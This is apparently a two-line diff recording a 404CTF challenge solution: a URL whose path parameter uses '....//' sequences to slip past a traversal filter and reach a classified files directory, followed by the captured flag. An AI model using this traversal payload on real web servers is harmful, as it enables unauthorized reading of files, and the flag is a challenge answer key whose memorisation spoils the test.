@@ -1,0 +1,2 @@
+https://fire-server.404ctf.fr/?path=....//....//....//var//files//classified//selenium
+404CTF{m0oN_S3cRe7s_4r3_bUr1eD_d33p}
